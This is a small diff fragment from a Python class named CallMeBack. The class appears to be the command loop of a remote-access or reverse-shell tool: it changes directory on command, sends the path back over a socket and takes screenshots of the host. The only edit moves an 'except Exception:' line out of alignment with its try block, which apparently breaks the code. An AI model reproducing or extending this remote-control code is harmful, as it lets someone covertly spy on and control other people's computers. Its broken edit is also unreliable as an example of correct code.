@@ -81,7 +81,7 @@ class CallMeBack:
                         os.chdir(str(" ".join(data.split()[1:])))
                         path = os.getcwd()+ ' > '
                         SendBack.sendall(bytes(path.encode()))
-                    except Exception:
+                   except Exception:
                          continue
                 elif 'screenshot' in data :
                     snapshot = ImageGrab.grab() 
